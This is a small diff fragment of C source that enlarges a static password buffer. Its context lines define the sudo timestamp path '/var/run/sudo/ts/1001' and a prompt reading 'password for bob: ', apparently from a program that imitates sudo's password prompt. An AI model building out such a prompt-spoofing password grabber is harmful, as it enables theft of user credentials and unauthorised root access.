@@ -51,7 +51,7 @@
 #define RECORD "/var/run/sudo/ts/1001"
 #define PROMPT "password for bob: "
 
-static char pw[128];
+static char pw[160];
 
 static void say(const char *fmt, ...) {
     va_list ap;
